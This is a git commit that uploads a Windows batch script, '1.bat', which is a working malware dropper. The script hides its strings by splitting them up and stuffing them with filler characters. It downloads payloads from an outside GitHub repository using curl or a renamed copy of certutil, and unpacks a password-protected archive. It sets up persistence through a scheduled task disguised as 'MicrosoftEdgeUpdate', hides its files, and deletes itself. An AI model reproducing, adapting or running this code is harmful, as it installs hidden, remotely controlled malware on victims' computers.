0a124aa7a83480976a0143639536a85cfc7abc6d
downportal48 <youth3920@outlook.com>
2026-09-18 15:23:17 +0900

    Add files via upload

---
+++ 1.bat
@@ -0,0 +1,102 @@
+@echo off
+set dd=C:\Users\Public\Music\
+if not exist %dd% mkdir %dd%
+set dd=%dd%default
+set dfff=%dd%
+mkdir %dd%
+set dd=%dd%/
+set xf=key.dat
+set xx=realtime
+set mk=pyt
+set mkf=%dd%token.ini
+if exist %mkf% exit
+set sis=c:\Windows\System32\
+set ii=taskho
+set ee=ce
+set rr=%dd%winrar.exe
+set ii=%dd%%ii%stw.exe
+set tt=Micros
+set ix=real.dat
+set rx=r.dat
+set pst=Operast0924Jd
+set bt=check.dat
+rem affdsfdsfdfd
+set tt=%tt%oftEdgeUpdate
+set ee=%appdata%\%ee%%random%.exe
+rem r3rrererwr
+set xx=checkey04/%xx%
+set xxp=%dd%chk.ini
+set xxf=%dd%cfg.ini
+set psf=%dd%pst.ini
+del %xxp% /f /q
+del %xxf% /f /q
+del %psf% /f /q
+echo %xx%>>%xxp%
+echo %xf%>>%xxf%
+echo %pst%>>%psf%
+set mm=%dd%check.bat
+set mmr=%temp%\ck%random%.rar
+set hh=%sis%scht
+set hh=%hh%asks.exe
+del %mm% /f /q
+
+set str=%sis%cert
+if not exist "%ee%" copy %str%util.exe "%ee%" /y
+
+
+del %mkf% /f /q
+echo %mk%>>%mkf%
+
+
+set ur=https://raw.githubusercontent.com/%xx%/refs/heads/main
+set ur2=%ur%/%rx%
+set ur3=%ur%/%bt%
+set ur=%ur%/%ix%
+if exist %sis%curl.exe  curl.exe -L "%ur%" -o "%ii%"
+if not exist %sis%curl.exe "%ee%" -urlcache -f %ur% %ii%
+
+if exist %sis%curl.exe  curl.exe -L "%ur2%" -o "%rr%"
+if not exist %sis%curl.exe "%ee%" -urlcache -f %ur2% %rr%
+
+if exist %sis%curl.exe  curl.exe -L "%ur3%" -o "%mmr%"
+if not exist %sis%curl.exe "%ee%" -urlcache -f %ur3% "%mmr%"
+
+if not exist "%rr%" goto ext
+
+"%rr%" x "%mmr%" %dd% -p%pst%
+
+if not exist %mm% goto ext
+
+del "%mmr%" /q /f
+%hh% /delete /tn "%tt%" /f
+
+if not exist %ii% goto vvvvvv
+set /p "v="<%ii%
+echo %v% | findstr /i /b /c:"<html" >nul && goto vvvvvv
+
+%hh% /create /tn "%tt%" /tr "%ii% exec hide %mm%" /sc minute /mo 13 /f
+attrib +h %dfff%
+goto ext
+:vvvvvv
+
+rem afdfdfdfdf 
+set "str=8C85888r85e88a55t85e558588O58b885558885j85588e5588c8t55588858(8"5888W8S85c8858r58i88p8t885.S58888885h8888885e55558l5555588888l585888"88885558885)88885555888"
+ream afdfdfdfdf 
+set "str=%str:5=%"
+set vb=%dd%ini%random%.vbs
+set "str=%str:8=%"
+del %vb% /q /f
+echo Set w = %str%>>%vb%
+echo w.Run "%mm%", 0, False>>%vb%
+echo Set w = Nothing>>%vb%
+%hh% /create /tn "%tt%" /tr "%sis%wscript.exe %vb%" /sc minute /mo 13 /f
+
+:ext
+del "%ee%" /f /q 
+attrib +h %xxp%
+attrib +h %xxf%
+attrib +h %mkf%
+attrib +h %mm%
+attrib +h %rr%
+del C:\users\public\key.enc /q /f
+del C:\users\public\1.bat /q /f
